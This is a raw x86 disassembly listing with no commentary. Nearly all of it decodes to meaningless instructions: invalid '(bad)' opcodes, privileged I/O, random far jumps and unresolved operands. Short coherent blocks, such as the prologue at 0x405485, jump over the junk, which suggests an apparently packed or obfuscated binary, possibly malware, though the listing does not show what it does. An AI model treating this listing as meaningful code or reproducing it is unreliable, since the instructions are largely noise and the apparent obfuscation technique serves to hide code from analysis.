  4051ce:	sti    
  4051cf:	int    0x93
  4051d1:	cmp    edx,DWORD PTR [edx+0x3790f6f4]
  4051d7:	xor    ah,BYTE PTR [ecx+0x12]
  4051da:	jge    0x405209
  4051dc:	and    eax,0x55ccbccb
  4051e1:	and    BYTE PTR [eax+ebp*4+0x49651f9b],ah
  4051e8:	mov    ch,0xc
  4051ea:	xor    bh,BYTE PTR [ebx]
  4051ec:	lea    edi,ds:[eax]
  4051ef:	fld    QWORD PTR [ebx]
  4051f1:	or     DWORD PTR [ebp-0x3e0ee779],ebx
  4051f7:	add    bl,BYTE PTR [esi+0x2e012156]
  4051fd:	scas   al,BYTE PTR es:[edi]
  4051fe:	imul   eax,DWORD PTR [edx],0xffffffea
  405201:	dec    esi
  405202:	fistp  QWORD PTR [edi-0x8]
  405205:	lock lahf 
  405207:	daa    
  405208:	mov    ebx,?
  40520a:	retf   
  40520b:	mov    edx,DWORD PTR [ebx-0x6c]
  40520e:	call   0xb22f:0xbcd00a4b
  405215:	ja     0x405261
  405217:	ja     0x40527d
  405219:	cwde   
  40521a:	popf   
  40521b:	adc    al,0x34
  40521d:	sbb    ecx,DWORD PTR [esi-0x3e]
  405220:	ror    BYTE PTR [edx],0xb0
  405223:	jle    0x40528e
  405225:	test   edx,esi
  405227:	int3   
  405228:	mov    edi,0xa451ace8
  40522d:	mov    eax,DWORD PTR [edx]
  40522f:	mov    esi,0x46876ef5
  405234:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405235:	xor    al,BYTE PTR [ebx+0x392cc99c]
  40523b:	icebp  
  40523c:	mov    eax,0xda14891e
  405241:	int3   
  405242:	sub    esp,DWORD PTR [ebp-0xa6d4864]
  405248:	imul   edx,DWORD PTR [edi],0x5e
  40524b:	mov    edx,0xa2fe9c27
  405250:	sbb    eax,0xd802fbea
  405255:	daa    
  405256:	out    0x12,eax
  405258:	jb     0x40521e
  40525a:	in     al,0xbc
  40525c:	test   BYTE PTR [eax],dh
  40525e:	outs   dx,BYTE PTR ds:[esi]
  40525f:	mov    ah,0x8d
  405261:	mov    al,ds:0x5a338081
  405266:	mov    ds:0x815b57d1,eax
  40526b:	add    al,0xb8
  40526d:	add    cl,0x54
  405270:	adc    eax,DWORD PTR [esi+eiz*1]
  405273:	sbb    esp,DWORD PTR [edx+0x3502f2a8]
  405279:	pop    edx
  40527a:	push   esi
  40527b:	aad    0x58
  40527d:	mov    WORD PTR [esi+0x17],gs
  405280:	ins    DWORD PTR es:[edi],dx
  405281:	lahf   
  405282:	loopne 0x4052b0
  405284:	xor    eax,eax
  405286:	and    DWORD PTR ds:0x38da2ac2,eax
  40528c:	inc    esp
  40528d:	test   BYTE PTR [edi+0x45],0x77
  405291:	xor    BYTE PTR [edi-0x22],al
  405294:	ins    DWORD PTR es:[edi],dx
  405295:	mov    ds:0xbbddc3e0,eax
  40529a:	xchg   BYTE PTR [esi-0x188ec317],ch
  4052a0:	cmp    eax,0x21f9d711
  4052a5:	outs   dx,DWORD PTR ds:[esi]
  4052a6:	pop    es
  4052a7:	add    eax,0xab14ecc4
  4052ac:	and    eax,0xea7abfdf
  4052b1:	jge    0x40523a
  4052b3:	jge    0x4052a8
  4052b5:	test   BYTE PTR [edx-0x19803a51],0xc9
  4052bc:	xor    esp,DWORD PTR [edx-0x4a1420c8]
  4052c2:	dec    ecx
  4052c3:	inc    eax
  4052c4:	jmp    0xc027:0x231d02e9
  4052cb:	outs   dx,DWORD PTR ds:[si]
  4052cd:	add    cl,BYTE PTR [edi+0x4c3f1eed]
  4052d3:	out    0x20,eax
  4052d5:	outs   dx,DWORD PTR ds:[esi]
  4052d6:	sbb    edi,DWORD PTR [ebp-0x15]
  4052d9:	and    BYTE PTR [esp+edx*1+0x53],cl
  4052dd:	add    DWORD PTR [ecx],0xffffffe7
  4052e0:	(bad)  [eax+0x79867ade]
  4052e6:	out    dx,al
  4052e7:	mov    cl,0xa5
  4052e9:	std    
  4052ea:	jp     0x40528f
  4052ec:	popf   
  4052ed:	dec    ecx
  4052ee:	add    al,0x89
  4052f0:	mov    DWORD PTR [ebp-0x22],edi
  4052f3:	dec    ebp
  4052f4:	repnz iret 
  4052f6:	enter  0x8ab1,0x40
  4052fa:	jne    0x405331
  4052fc:	(bad)  
  4052fe:	push   edx
  4052ff:	in     eax,0x2
  405301:	adc    al,0xde
  405303:	cwde   
  405304:	into   
  405305:	popf   
  405306:	sub    bh,BYTE PTR [eax-0x5b]
  405309:	dec    BYTE PTR [ebx]
  40530b:	dec    ebx
  40530c:	and    BYTE PTR [ebx],bh
  40530e:	es cwde 
  405310:	mov    ds:0xab095ae,eax
  405315:	xchg   edi,eax
  405316:	frstor [ecx+0x3f]
  405319:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40531a:	rol    DWORD PTR [edx+ebp*1-0x4e012b20],cl
  405321:	cmp    esi,0xb07cf3d6
  405327:	mov    bh,0x43
  405329:	inc    DWORD PTR [ebx]
  40532b:	leave  
  40532c:	pop    ds
  40532d:	jmp    0x4052e0
  40532f:	inc    ebx
  405330:	sub    eax,0xede4a39d
  405335:	jge    0x4052db
  405337:	imul   eax,eax,0xd02e4f7a
  40533d:	mov    bh,dh
  40533f:	ja     0x40537a
  405341:	sbb    DWORD PTR fs:0x4ed424bc,esi
  405348:	enter  0x2064,0xb3
  40534c:	and    ch,bl
  40534e:	mov    edx,0x4fbbbaff
  405353:	jo     0x4052f6
  405355:	xlat   BYTE PTR ds:[ebx]
  405356:	shl    DWORD PTR [edi-0x56],1
  405359:	sbb    BYTE PTR [ebx+0x14],cl
  40535c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40535d:	push   esp
  40535e:	cdq    
  40535f:	and    DWORD PTR [ebx],ebx
  405361:	pop    edi
  405362:	xchg   esp,eax
  405363:	add    esi,edi
  405365:	pop    ds
  405366:	in     eax,dx
  405367:	hlt    
  405368:	int    0x5b
  40536a:	xor    DWORD PTR [ecx-0x5c03838f],ebx
  405370:	ja     0x40532b
  405372:	jnp    0x405310
  405374:	mov    cl,0x2f
  405376:	mov    bl,BYTE PTR [eax-0xe]
  405379:	mov    bh,0xf2
  40537b:	xchg   edx,eax
  40537c:	iret   
  40537d:	dec    eax
  40537e:	popa   
  40537f:	xchg   edx,eax
  405380:	repz mov dh,0xa4
  405383:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405384:	sub    bh,ah
  405386:	xchg   DWORD PTR [eax+0x3b4401e3],ecx
  40538c:	repz pushf 
  40538e:	sti    
  40538f:	and    bh,BYTE PTR [ebp+0x3c934ef2]
  405395:	(bad)  
  405396:	mov    ah,0x9b
  405398:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405399:	xchg   ebx,eax
  40539a:	aas    
  40539b:	add    esp,eax
  40539d:	aad    0x59
  40539f:	xor    esi,DWORD PTR [edi+edi*1-0x48]
  4053a3:	push   ecx
  4053a4:	xchg   esp,eax
  4053a5:	sbb    eax,0xa85efac5
  4053aa:	xor    al,0x4
  4053ac:	pop    ss
  4053ad:	and    ebx,DWORD PTR [ecx]
  4053af:	lds    edx,FWORD PTR [esp+ebp*2-0x79d31958]
  4053b6:	jmp    0x969024e4
  4053bb:	mov    BYTE PTR [esi+ebx*8],ah
  4053be:	mov    cl,0x8
  4053c0:	pop    esp
  4053c1:	mov    cl,0xde
  4053c3:	xor    DWORD PTR [ebp-0x2b],ecx
  4053c6:	in     eax,dx
  4053c7:	jecxz  0x405442
  4053c9:	in     al,dx
  4053ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053cb:	and    eax,0xbdd37602
  4053d0:	int    0x5
  4053d2:	aas    
  4053d3:	out    dx,al
  4053d4:	pushf  
  4053d5:	or     ebp,ebp
  4053d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053d8:	stos   DWORD PTR es:[edi],eax
  4053d9:	nop
  4053da:	pop    eax
  4053db:	enter  0x4d9,0xce
  4053df:	cli    
  4053e0:	dec    ebx
  4053e1:	shr    DWORD PTR [ebp-0x16d399d],cl
  4053e7:	cli    
  4053e8:	push   esp
  4053e9:	mov    ds:0x26499d37,eax
  4053ee:	dec    edx
  4053ef:	lea    edi,[esi-0x1f5e5e4b]
  4053f5:	repnz into 
  4053f7:	out    0xf3,al
  4053f9:	mov    ch,0x2f
  4053fb:	adc    bh,BYTE PTR [eax-0x54c03cb8]
  405401:	sub    dh,BYTE PTR [edx]
  405403:	jo     0x405398
  405405:	jae    0x4053e9
  405407:	data16 bnd jmp 0x40546d
  40540b:	or     dh,0x8b
  40540e:	mov    ecx,0xfd40f21d
  405413:	sub    ebp,DWORD PTR [ebx+0x1baee57d]
  405419:	and    bl,BYTE PTR [ebx]
  40541b:	pop    edi
  40541c:	cmp    eax,0xf02391fa
  405421:	inc    edx
  405422:	popf   
  405423:	sub    DWORD PTR [ebp-0x73],ebp
  405426:	xchg   BYTE PTR ds:0x833868f5,bl
  40542c:	pop    ebx
  40542d:	sbb    edi,esp
  40542f:	or     esi,DWORD PTR [eax-0x37]
  405432:	pop    es
  405433:	mov    DWORD PTR [bx-0x70],esp
  405437:	les    ebx,FWORD PTR [edx]
  405439:	pusha  
  40543a:	imul   esi,DWORD PTR [esi+0x6c4575d1],0xffffffe4
  405441:	xlat   BYTE PTR ds:[ebx]
  405442:	ja     0x4053db
  405444:	hlt    
  405445:	scas   al,BYTE PTR es:[edi]
  405446:	and    BYTE PTR [edi+0x1c],0xb2
  40544a:	enter  0x38dc,0x48
  40544e:	mov    ?,ebp
  405450:	aad    0x2e
  405452:	mov    bh,BYTE PTR [edx]
  405454:	imul   ebx,ebx,0xd64f2ea4
  40545a:	dec    ecx
  40545b:	push   eax
  40545c:	inc    esi
  40545d:	js     0x405405
  40545f:	pop    esp
  405460:	pop    ebx
  405461:	mov    cs,WORD PTR [ecx+0x6b]
  405464:	frstor [ecx]
  405466:	xchg   esp,eax
  405467:	sbb    al,0xff
  405469:	jns    0x40548f
  40546b:	or     al,BYTE PTR [edx+0x40]
  40546e:	jmp    0xa29a:0x4c821523
  405475:	sub    al,0x2c
  405477:	mov    edx,ds
  405479:	push   esp
  40547a:	mov    esi,0xe4129786
  40547f:	pop    ebp
  405480:	pop    esi
  405481:	leave  
  405482:	ret    0xc
  405485:	push   ebp
  405486:	mov    ebp,esp
  405488:	push   ecx
  405489:	mov    edx,DWORD PTR ds:0x42e784
  40548f:	mov    edx,DWORD PTR [edx]
  405491:	sbb    DWORD PTR ds:0x42e6eb,edx
  405497:	jmp    0x40576a
  40549c:	pop    ecx
  40549d:	scas   al,BYTE PTR es:[edi]
  40549e:	sbb    BYTE PTR [ebx-0xd],al
  4054a1:	push   ecx
  4054a2:	pop    ecx
  4054a3:	mov    dh,0xd4
  4054a5:	(bad)
  4054a8:	ds dec ecx
  4054aa:	jb     0x40547d
  4054ac:	adc    BYTE PTR [edi],dh
  4054ae:	jo     0x405520
  4054b0:	stos   BYTE PTR es:[edi],al
  4054b1:	jle    0x405523
  4054b3:	jo     0x4054e0
  4054b5:	xor    dl,BYTE PTR [ecx-0x5f]
  4054b8:	jp     0x405484
  4054ba:	mov    bl,0x1
  4054bc:	mov    eax,ds:0x3a40dec9
  4054c1:	cmc    
  4054c2:	cmp    al,0x97
  4054c4:	loope  0x405515
  4054c6:	xchg   BYTE PTR [eax+ebp*8+0x3423de45],cl
  4054cd:	xor    BYTE PTR [ebx],0x64
  4054d0:	push   cs
  4054d1:	cmc    
  4054d2:	adc    eax,0xae9f436b
  4054d7:	ins    DWORD PTR es:[edi],dx
  4054d8:	add    DWORD PTR [ebp+0x73],0xd640a9ae
  4054df:	dec    esi
  4054e0:	ja     0x40550c
  4054e2:	iret   
  4054e3:	dec    ebp
  4054e4:	xchg   esi,eax
  4054e5:	pop    edi
  4054e6:	js     0x405542
  4054e8:	jmp    0xd570:0x8ce22e6b
  4054ef:	jg     0x405487
  4054f1:	adc    ch,dl
  4054f3:	addr16 jae 0x405554
  4054f6:	xchg   BYTE PTR [ecx-0x53505955],ah
  4054fc:	ss (bad) 
  4054fe:	xchg   esi,eax
  4054ff:	leave  
  405500:	pop    edi
  405501:	ret    0x50f1
  405504:	je     0x405555
  405506:	fcom   QWORD PTR [ecx-0x149cf3e1]
  40550c:	adc    bl,BYTE PTR [edx+0x72]
  40550f:	lods   eax,DWORD PTR ds:[esi]
  405510:	inc    edx
  405511:	pop    esp
  405512:	and    eax,ebp
  405514:	inc    edi
  405515:	mov    eax,ds:0xf5cdefc3
  40551a:	call   0x774e7eb8
  40551f:	fld    DWORD PTR [esp+edx*2]
  405522:	lahf   
  405523:	clc    
  405524:	or     al,0xf8
  405526:	jae    0x405501
  405528:	rcr    dh,1
  40552a:	push   eax
  40552b:	xchg   DWORD PTR [edx-0xb2d7e8d],esi
  405531:	mov    ds:0x18c45b3e,eax
  405536:	clc    
  405537:	mov    ecx,0x493aafd2
  40553c:	scas   al,BYTE PTR es:[edi]
  40553d:	cld    
  40553e:	sbb    eax,0x1b368e2d
  405543:	lock ins BYTE PTR es:[edi],dx
  405545:	mov    esi,0xc14c4279
  40554a:	xor    ecx,DWORD PTR [eax]
  40554c:	cmp    BYTE PTR [esi],0x71
  40554f:	aaa    
  405550:	dec    esi
  405551:	and    BYTE PTR [ecx-0x14],0xea
  405555:	add    esp,DWORD PTR [ecx+eiz*1]
  405558:	and    DWORD PTR [eax+0x30],0xf29dd84b
  40555f:	(bad)  
  405560:	lock (bad) 
  405562:	pushf  
  405563:	mov    esp,cs
  405565:	ret    0xb1e
  405568:	adc    edx,ecx
  40556a:	lock pop esi
  40556c:	mov    WORD PTR [ecx-0x3f],?
  40556f:	and    cl,BYTE PTR [edi-0x80]
  405572:	call   0x42ff0d2b
  405577:	popa   
  405578:	ret    
  405579:	mov    dl,0x86
  40557b:	ins    BYTE PTR es:[edi],dx
  40557c:	or     BYTE PTR [esi-0x11617abe],ch
  405582:	and    al,0xac
  405584:	cmp    BYTE PTR [ecx+ecx*8+0x7e],0x31
  405589:	or     al,0xe8
  40558b:	enter  0xb161,0xb8
  40558f:	add    al,BYTE PTR [esi-0x52c855b9]
  405595:	mov    cl,0x94
  405597:	xchg   BYTE PTR [eax],bh
  405599:	clc    
  40559a:	cdq    
  40559b:	mov    edi,0x374ab967
  4055a0:	or     eax,0x456ecc82
  4055a5:	mov    WORD PTR [ebx+0x539862fd],ss
  4055ab:	adc    eax,0xa68cdfc8
  4055b0:	and    ebx,DWORD PTR [ebp-0x78de6e3b]
  4055b6:	jg     0x405583
  4055b8:	push   eax
  4055b9:	xor    BYTE PTR [edi+eiz*2-0x6b],ch
  4055bd:	jle    0x405591
  4055bf:	pop    ebx
  4055c0:	lods   eax,DWORD PTR ds:[esi]
  4055c1:	push   edi
  4055c2:	dec    esi
  4055c3:	or     ch,BYTE PTR [eax-0x488e4557]
  4055c9:	(bad)  
  4055ca:	mov    eax,0xb8154657
  4055cf:	scas   al,BYTE PTR es:[edi]
  4055d0:	sbb    eax,0xbb25d29f
  4055d5:	ret    
  4055d6:	dec    DWORD PTR [ecx+eiz*8+0x15]
  4055da:	add    ecx,edx
  4055dc:	push   ecx
  4055dd:	imul   esi,DWORD PTR [ecx-0x26],0x43c1be85
  4055e4:	adc    bh,ch
  4055e6:	and    BYTE PTR [ecx-0x25],al
  4055e9:	cmp    edx,DWORD PTR [ebp-0x41]
  4055ec:	dec    eax
  4055ed:	(bad)  
  4055ee:	stos   BYTE PTR es:[edi],al
  4055ef:	mov    al,BYTE PTR [edi]
  4055f1:	cmp    DWORD PTR [esi+ebp*2-0x363a4feb],ebx
  4055f8:	pop    ds
  4055f9:	or     al,0xce
  4055fb:	enter  0xc75b,0x7
  4055ff:	ss jmp 0x40561e
  405602:	push   esi
  405603:	fs mov ch,0x1c
  405606:	mov    cl,0x90
  405608:	cmp    eax,0x557ab47
  40560d:	cmp    al,0xd4
  40560f:	aas    
  405610:	pop    ebp
  405611:	arpl   WORD PTR [ecx-0x4d63d3b1],dx
  405617:	pop    eax
  405618:	mov    ebx,0x518e32e5
  40561d:	adc    ebp,DWORD PTR [ebx]
  40561f:	or     dl,BYTE PTR [eax]
  405621:	xor    dl,BYTE PTR [esi]
  405623:	fldcw  WORD PTR [esi]
  405625:	adc    BYTE PTR [esi],dl
  405627:	mov    cl,0xf2
  405629:	scas   eax,DWORD PTR es:[edi]
  40562a:	jbe    0x40562a
  40562c:	lods   al,BYTE PTR ds:[esi]
  40562d:	xchg   BYTE PTR [esi-0x7744d8a8],ch
  405633:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405635:	xor    edx,DWORD PTR [edi-0x7a]
  405638:	or     dl,BYTE PTR [edx-0x24]
  40563b:	test   DWORD PTR [ecx-0x48],edx
  40563e:	dec    ecx
  40563f:	jle    0x405641
  405641:	fcomp  DWORD PTR [eax+ebp*2+0x764c6140]
  405648:	iret   
  405649:	and    eax,0xaac4d67d
  40564e:	sub    DWORD PTR [ebx],ebx
  405650:	pop    es
  405651:	cli    
  405652:	push   eax
  405653:	jbe    0x40569d
  405655:	pop    ebp
  405656:	test   eax,0x9789945d
  40565b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40565c:	repnz and ebx,DWORD PTR [ebp+0x7a37577a]
  405663:	mov    esp,0xc6a29073
  405668:	push   ebx
  405669:	in     eax,dx
  40566a:	sbb    BYTE PTR ds:0xa0ff1dba,cl
  405670:	xchg   esi,eax
  405671:	gs neg edx
  405674:	mov    bh,0xb9
  405676:	imul   ecx,esp,0xffffffdd
  405679:	adc    BYTE PTR [ebp-0x7a],al
  40567c:	(bad)  
  40567d:	loop   0x4056c2
  40567f:	inc    ebx
  405680:	jo     0x4056d6
  405682:	mov    esi,0xcdcee769
  405687:	cwde   
  405688:	push   esi
  405689:	sbb    eax,0x37baf9e3
  40568e:	lds    edi,FWORD PTR [eax-0x5b]
  405691:	aam    0xba
  405693:	push   ebp
  405694:	pusha  
  405695:	and    esp,DWORD PTR [ebp+0x7f]
  405698:	in     al,0xd9
  40569a:	pop    esp
  40569b:	cwde   
  40569c:	scas   al,BYTE PTR es:[edi]
  40569d:	ss mov esi,0x18acb777
  4056a3:	sar    DWORD PTR [ecx-0x7849b28e],cl
  4056a9:	(bad)
  4056ac:	pop    esp
  4056ad:	mov    esi,0x84b0a7b5
  4056b2:	test   BYTE PTR [edx+0x111b44e1],cl
  4056b8:	inc    ebx
  4056b9:	test   eax,0x9f7929d2
  4056be:	adc    DWORD PTR [edi-0x2e],ebp
  4056c1:	shl    BYTE PTR [edx+ecx*2-0x32327556],0x3a
  4056c9:	mov    eax,0x3e2b0da1
  4056ce:	int3   
  4056cf:	je     0x4056ed
  4056d1:	pop    ebx
  4056d2:	xor    al,0xfd
  4056d4:	jl     0x40566c
  4056d6:	outs   dx,BYTE PTR ds:[esi]
  4056d7:	sahf   
  4056d8:	cmp    DWORD PTR [edx],0x1e73edc2
  4056de:	sub    bh,cl
  4056e0:	nop
  4056e1:	mov    cl,0xb5
  4056e3:	sbb    BYTE PTR [ebx+0x44],al
  4056e6:	test   al,dl
  4056e8:	(bad)  
  4056e9:	je     0x405681
  4056eb:	and    cl,BYTE PTR [ecx+0x35]
  4056ee:	push   esi
  4056ef:	aam    0xdf
  4056f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056f2:	(bad)  
  4056f3:	data16 mov cl,ah
  4056f6:	call   FWORD PTR [edi+esi*8]
  4056f9:	mov    ah,0xf3
  4056fb:	pop    ebx
  4056fc:	and    dh,BYTE PTR [edi-0x66]
  4056ff:	xor    esp,ebx
  405701:	mov    eax,ds:0x3a7385d2
  405706:	pop    ss
  405707:	stos   BYTE PTR es:[edi],al
  405708:	sbb    DWORD PTR [eax+0x2526270],ebp
  40570e:	data16 in al,0x3c
  405711:	ja     0x40577c
  405713:	or     eax,0x1e2a8344
  405718:	mov    edi,0x96228300
  40571d:	sar    DWORD PTR [esi-0x67],1
  405720:	stc    
  405721:	cwde   
  405722:	sbb    BYTE PTR [edx-0x5],al
  405725:	clc    
  405726:	pop    esi
  405727:	das    
  405728:	jmp    DWORD PTR [ecx-0x23]
  40572b:	mov    edi,0x6d5a6bfd
  405730:	(bad)  [edx+0x20c0457c]
  405736:	lods   eax,DWORD PTR ds:[esi]
  405737:	loopne 0x405786
  405739:	mov    ah,0xdc
  40573b:	lods   al,BYTE PTR ds:[esi]
  40573c:	loop   0x4056e1
  40573e:	xchg   ecx,eax
  40573f:	idiv   bl
  405741:	add    esp,DWORD PTR [esi]
  405743:	jle    0x4056de
  405745:	xchg   esi,eax
  405746:	inc    eax
  405747:	sub    ah,dh
  405749:	sbb    DWORD PTR [edi+0x3fd96e24],esi
  40574f:	mov    esp,0xff0dc9b4
  405754:	(bad)  
  405756:	cdq    
  405757:	adc    esi,esp
  405759:	mov    al,0xb5
  40575b:	ret    0x6916
  40575e:	mov    eax,ds:0x931d625e
  405763:	mov    ebx,0x68cb0df3
  405768:	popa   
  405769:	inc    edx
  40576a:	push   ecx
  40576b:	movzx  eax,WORD PTR ds:0x42fd86
  405772:	and    eax,DWORD PTR ds:0x42fd7a
  405778:	mov    ds:0x42fd86,eax
  40577d:	jmp    0x405a50
  405782:	ja     0x4057cf
  405784:	and    eax,0x717221b4
  405789:	dec    ebx
  40578a:	xchg   DWORD PTR [edx-0x10486e42],eax
  405790:	ins    BYTE PTR es:[edi],dx
  405791:	jnp    0x4057dd
  405793:	xor    eax,0x7eaa7070
  405798:	jo     0x40580a
  40579a:	sub    ebp,DWORD PTR [ecx+0x4c77b470]
  4057a0:	lds    eax,FWORD PTR [edi+0xa]
  4057a3:	call   esp
  4057a5:	ins    BYTE PTR es:[edi],dx
  4057a6:	push   ecx
  4057a7:	imul   ebp,ecx,0x27
  4057aa:	xchg   esp,eax
  4057ab:	int    0x99
  4057ad:	cmp    BYTE PTR [esi-0x5b8f1b1e],ch
  4057b3:	fdivr  QWORD PTR [edi+0x11]
  4057b6:	jns    0x405822
  4057b8:	sub    al,0x8a
  4057ba:	mov    ds:0x1a2555c8,al
  4057bf:	sbb    BYTE PTR [eax-0x24084d81],0x38
  4057c6:	pop    es
  4057c7:	(bad)  
  4057c8:	dec    eax
  4057c9:	shl    DWORD PTR [ecx+esi*2-0x5f],1
  4057cd:	popf   
  4057ce:	mov    eax,DWORD PTR [edx-0x3eec8d09]
  4057d4:	test   cl,dl
  4057d6:	xchg   ebp,eax
  4057d7:	js     0x405813
  4057d9:	(bad)  
  4057da:	mov    esp,0xb0046745
  4057df:	je     0x4057b6
  4057e1:	clc    
  4057e2:	popf   
  4057e3:	add    cl,BYTE PTR [edi+edx*1+0x1c]
  4057e7:	xor    al,0x23
  4057e9:	sub    al,ch
  4057eb:	test   BYTE PTR [ecx],al
  4057ed:	out    dx,eax
  4057ee:	push   ebp
  4057ef:	xor    al,0xa5
  4057f1:	shl    DWORD PTR [ecx+0x7accbf39],cl
  4057f7:	jb     0x405861
  4057f9:	push   esi
  4057fa:	sbb    ebx,DWORD PTR [ebx+0x155e8b1a]
  405800:	ror    DWORD PTR [edx+0x34b4d8c1],1
  405806:	jno    0x405801
  405808:	jnp    0x4057dd
  40580a:	test   DWORD PTR [edx],edx
  40580c:	scas   al,BYTE PTR es:[edi]
  40580d:	jle    0x405845
  40580f:	and    eax,0x39694693
  405814:	mov    WORD PTR [edx+0x79],ds
  405817:	daa    
  405818:	sub    al,0xa
  40581a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40581b:	aad    0xd6
  40581d:	xlat   BYTE PTR ds:[ebx]
  40581e:	repnz pop edx
  405820:	loopne 0x4057e5
  405822:	out    dx,al
  405823:	lods   eax,DWORD PTR ds:[esi]
  405824:	jl     0x405839
  405826:	pop    esp
  405827:	into   
  405828:	ds in  eax,dx
  40582a:	inc    ecx
  40582b:	repnz and al,0x1a
  40582e:	jnp    0x405873
  405830:	rcr    DWORD PTR [ebx-0x8b3c5d2],0x39
  405837:	inc    esp
  405838:	dec    eax
  405839:	mov    ah,0xc7
  40583c:	xchg   ecx,eax
  40583d:	rol    BYTE PTR [esi-0x72],cl
  405840:	adc    al,0xb6
  405842:	sti    
  405843:	jo     0x4058b5
  405845:	push   0x44
  405847:	sbb    dh,dl
  405849:	adc    al,0x40
  40584b:	je     0x4058a7
  40584d:	(bad)  
  40584e:	(bad)  
  40584f:	test   eax,0x65ac779d
  405854:	fild   WORD PTR [ebp-0x23]
  405857:	pop    es
  405858:	or     BYTE PTR [ecx-0x4723c4a0],0xcc
  40585f:	dec    ecx
  405860:	mov    bh,0x2a
  405862:	inc    edi
  405863:	sub    BYTE PTR [edi-0x19b5b120],ch
  405869:	mov    eax,0x697558b5
  40586e:	leave  
  40586f:	jp     0x40580c
  405871:	std    
  405872:	xchg   edi,eax
  405873:	pop    ebp
  405874:	adc    BYTE PTR [eax],ch
  405876:	dec    ecx
  405877:	arpl   WORD PTR cs:[esi+eax*1+0x5ac2276e],bp
  40587f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405880:	sbb    al,0xf8
  405882:	leave  
  405883:	pop    eax
  405884:	jmp    0x40580b
  405886:	jne    0x40580e
  405888:	cmp    al,0x60
  40588a:	int3   
  40588b:	xchg   ecx,eax
  40588c:	dec    edi
  40588d:	mov    ds:0x7ae89bba,eax
  405892:	xor    al,0xb0
  405894:	arpl   si,bx
  405896:	mov    ch,0x0
  405898:	adc    ecx,DWORD PTR [ebp-0xa]
  40589b:	inc    esp
  40589c:	pop    esi
  40589d:	xchg   edx,eax
  40589e:	mov    gs,esi
  4058a0:	sbb    BYTE PTR [edi-0x1a],al
  4058a3:	jnp    0x4058fb
  4058a5:	inc    ecx
  4058a6:	mov    ch,0x88
  4058a8:	mul    BYTE PTR [edi]
  4058aa:	(bad)  
  4058ab:	jecxz  0x405914
  4058ad:	stos   DWORD PTR es:[edi],eax
  4058ae:	xchg   esi,eax
  4058af:	test   edx,ecx
  4058b1:	pop    es
  4058b2:	es sbb eax,0xdf474e6c
  4058b8:	mov    cs,ebp
  4058ba:	je     0x4058d3
  4058bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058bd:	cmp    al,0x85
  4058bf:	xchg   esp,eax
  4058c0:	movnti DWORD PTR ss:[edi+0x60],esi
  4058c5:	icebp  
  4058c6:	out    0x88,al
  4058c8:	fidivr DWORD PTR [ebp-0x1f]
  4058cb:	scas   al,BYTE PTR es:[edi]
  4058cc:	jle    0x405863
  4058ce:	fwait
  4058cf:	in     al,dx
  4058d0:	in     eax,0x3e
  4058d2:	pop    esp
  4058d3:	stos   DWORD PTR es:[edi],eax
  4058d4:	xor    al,0x57
  4058d6:	ret    0x7e4c
  4058d9:	aad    0x5f
  4058db:	mov    ch,0x51
  4058dd:	es inc esp
  4058df:	out    dx,eax
  4058e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058e1:	push   0x59
  4058e3:	and    DWORD PTR [eax],eax
  4058e5:	adc    bh,dh
  4058e7:	mov    esp,0x20247efe
  4058ec:	jmp    FWORD PTR ds:0x71be74
  4058f2:	scas   eax,DWORD PTR es:[edi]
  4058f3:	cmp    ebp,DWORD PTR [edi]
  4058f5:	adc    cl,BYTE PTR [ecx-0x68]
  4058f8:	fwait
  4058f9:	push   ebp
  4058fa:	xor    BYTE PTR [eax+0x4c],dh
  4058fd:	fcom   st(1)
  4058ff:	scas   al,BYTE PTR es:[edi]
  405900:	adc    DWORD PTR [ecx+esi*8],edx
  405903:	xor    BYTE PTR [esi-0x6faa21f8],al
  405909:	data16 fsub st,st(0)
  40590c:	xchg   edx,eax
  40590d:	sub    esp,edi
  40590f:	push   ds
  405910:	mov    ebp,0x8fe1acfe
  405915:	mov    cl,0x99
  405917:	cmp    bh,ah
  405919:	in     eax,0x51
  40591b:	push   0xe6f9a1d8
  405920:	ror    BYTE PTR [esi+edi*1-0x1f1fc723],cl
  405927:	cdq    
  405928:	mov    ebp,0x20780992
  40592d:	or     ecx,ecx
  40592f:	dec    esi
  405930:	inc    eax
  405931:	or     ah,BYTE PTR [eax+0x1f84b2d5]
  405937:	loopne 0x4058f0
  405939:	iret   
  40593a:	mov    bh,0xa9
  40593c:	push   ebp
  40593d:	repz sub BYTE PTR [esi+0x29],0x4f
  405942:	in     eax,dx
  405943:	cdq    
  405944:	mov    bl,ch
  405946:	pop    ss
  405947:	mov    al,ds:0xae6e1c65
  40594c:	fmulp  st(6),st
  40594e:	jp     0x405998
  405950:	out    dx,al
  405951:	or     eax,0x716cfbe1
  405956:	jne    0x405972
  405958:	jns    0x4058f7
  40595a:	stos   BYTE PTR es:[edi],al
  40595b:	xchg   edi,eax
  40595c:	nop
  40595d:	inc    edi
  40595e:	enter  0xc0f3,0x1b
  405962:	sub    al,0x3d
  405964:	xor    dh,BYTE PTR ds:0xc7cc4a9a
  40596a:	dec    ecx
  40596b:	adc    DWORD PTR [eax],edi
  40596d:	cmp    DWORD PTR es:[edx],eax
  405970:	dec    ebp
  405971:	dec    edi
  405972:	popf   
  405973:	fwait
  405974:	sub    bl,bh
  405976:	std    
  405977:	sbb    ecx,esi
  405979:	into   
  40597a:	pop    edi
  40597b:	mov    DWORD PTR [esi-0x53],esi
  40597e:	sbb    ebp,ebx
  405980:	call   0x16f9:0xc3037024
  405987:	and    dl,BYTE PTR [edi]
  405989:	in     al,0x18
  40598b:	stos   BYTE PTR es:[edi],al
  40598c:	daa    
  40598d:	fist   DWORD PTR [ebx+0x7492d086]
  405993:	icebp  
  405994:	cld    
  405995:	mov    ds:0x34867862,al
  40599a:	lahf   
  40599b:	dec    esi
  40599c:	fsubr  st(6),st
